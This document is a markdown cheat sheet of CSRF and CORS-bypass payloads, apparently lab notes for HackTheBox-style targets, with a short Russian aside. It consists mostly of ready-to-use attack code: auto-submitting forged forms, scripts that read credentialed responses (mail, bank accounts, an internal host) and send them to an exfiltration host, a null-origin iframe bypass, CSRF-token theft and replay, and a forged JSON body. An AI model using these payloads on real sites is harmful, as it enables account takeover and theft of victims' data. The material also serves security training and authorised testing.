# CSRF

## Attacks
### Autosubmit form
```html
<html>
  <body>
    <form method="GET" action="http://csrf.vulnerablesite.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Obtain response
```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
...OR..
<script>
    async function exfiltrate_data(url) {
        // get data
        const response = await fetch(url, {credentials: "include"});
        const data = await response.text();

        // exfiltrate data
        await fetch("https://exfiltrate.htb/exfiltrate?c=" + btoa(data));
    }

    // exfiltrate mails
    exfiltrate_data("https://mymails.htb/getmails");

    // exfiltrate bank data
    exfiltrate_data("https://mybank.htb/myaccounts");

    // exfiltrate internal service
    exfiltrate_data("https://192.168.178.5/");
</script>
```

### Referer bypass
Если приложение работает с отсутствующим заголовком `Referer`, то можно его исключить через html
```html
<meta name="referrer" content="never">
```

## CORS
### Null origin
```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>"></iframe>
```

### Bypassing CSRF Tokens via CORS Misconfigurations
```javascript
<script>
	// GET CSRF token
	var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
	var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

	// do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = `promote=htb-stdnt&csrf=${csrftoken}`;
    csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
	csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>
```

### CSRF with JSON Request Body
POC
```html
<html>
  <body>
    <form method="POST" action="http://csrf.vulnerablesite.htb/profile.php" enctype="text/plain">
      <input type="hidden" name='{"promote": "htb-stdnt", "dummykey' value='": "dummyvalue"}' />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Result request:
```http
POST /profile.php HTTP/1.1
Host: csrf.vulnerablesite.htb
Content-Length: 53
Content-Type: text/plain

{"promote": "htb-stdnt", "dummykey=": "dummyvalue"}
```